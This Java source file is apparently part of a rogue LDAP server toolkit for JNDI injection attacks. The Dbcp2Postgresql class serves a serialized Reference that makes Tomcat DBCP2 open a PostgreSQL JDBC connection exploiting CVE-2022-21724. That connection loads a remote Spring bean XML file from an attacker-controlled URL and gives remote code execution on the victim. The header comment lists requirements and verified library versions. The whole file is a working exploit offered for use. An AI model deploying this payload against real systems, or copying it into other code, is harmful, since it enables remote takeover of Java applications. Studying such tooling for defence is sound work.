package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 * RCE via JDBC connection to a vulnerable Postgresql DB impacted by CVE-2022-21724.
 * A database connection can be triggered by using the BasicDataSourceFactory of Tomcat's DBCP2 and
 * the connection string of this class along with the JDBC driver can
 * be controlled. So by specifying an arbitrary socketFactory class along with a single parameter
 * socketFactoryArg in the JDBC connection string a class with a single argument public constructor
 * can be instantiated. ClassPathXmlApplicationContext provides a single argument public constructor
 * that can pointed to a remote XML file with the definition of a malicious spring bean there by triggering an RCE
 *
 * @see:
 *      https://www.veracode.com/blog/research/exploiting-jndi-injections-java
 *      https://b1ue.cn/archives/529.html 
 *
 * Input:
 *    Config.command = URL that provides a bean to be consumed by ClassPathXmlApplicationContext  "http://0.0.0.0:7800/bean.xml"
 *
 * Requires:
 *  Tomcat DBCP2, Spring and postgresql in classpath
 *
 *  Verified on:
 *  - org.apache.tomcat.embed:tomcat-embed-core:8.5.61
 *  - org.postgresql:postgresql:42.3.1
 *  - org.springframework:spring-context:5.3.21
 *
 * @author snowyowl
 */

@LdapMapping(uri = {"/o=dbcp2-postgresql"})
public class Dbcp2Postgresql implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with tomcat-dbcp2-postgres-sql payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        // works only on versions affected by CVE-2022-21724.
         String url = "jdbc:postgresql://localhost:5432/testdb?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=" + Config.command;

        Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.postgresql.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
